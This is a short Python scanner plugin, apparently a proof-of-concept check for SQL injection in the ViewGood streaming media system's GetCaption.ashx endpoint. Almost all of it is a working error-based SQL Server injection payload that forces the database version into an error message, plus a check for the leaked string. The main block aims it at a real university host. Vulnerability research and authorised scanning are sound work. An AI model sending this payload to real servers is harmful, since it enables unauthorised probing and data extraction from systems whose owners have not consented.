#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 烽火戏诸侯
#_PlugName_ = 远古流媒体系统  GetCaption.ashx注入漏洞


def assign(service, arg):
    if service == "viewgood":
        return True, arg

def audit(arg):
    payload ='VIEWGOOD/ADI/portal/GetCaption.ashx?CaptionType=1%27%20and%201%3Dconvert%28int%2C%28char%28116%29%252bchar%28121%29%252bchar%28113%29%252b@@version%29%29--&AssetID=1&CaptionName=11'
    target = arg + payload 
    code, head, res, errcode, _ = curl.curl2(target)
    if code == 500 and 'tyqMicrosoft SQL Server' in res:
        security_hole(target)
           
        

if __name__ == '__main__':
    from dummy import *
    audit(assign('viewgood', 'http://tv.luas.edu.cn/')[1])